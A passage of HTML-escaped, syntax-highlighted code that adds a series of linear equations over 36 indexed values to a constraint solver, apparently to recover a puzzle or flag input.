style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23824&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13865&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50179&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span 